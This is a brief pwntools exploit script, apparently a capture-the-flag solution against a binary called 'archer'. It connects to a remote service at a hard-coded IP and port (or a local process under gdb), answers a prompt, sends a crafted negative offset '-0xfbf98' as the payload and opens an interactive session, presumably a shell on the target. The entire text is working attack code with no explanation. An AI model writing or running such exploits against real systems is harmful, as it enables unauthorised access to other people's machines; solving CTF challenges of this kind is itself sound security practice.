from pwn import *

DEBUG = False

if DEBUG:
    r = process("./archer")
    gdb.attach(r)
else:
    r = remote("193.57.159.27", 31978)

print(r.recv())
r.sendline("yes")
print(r.recv())

payload = "-0xfbf98"

r.sendline(payload)

r.interactive()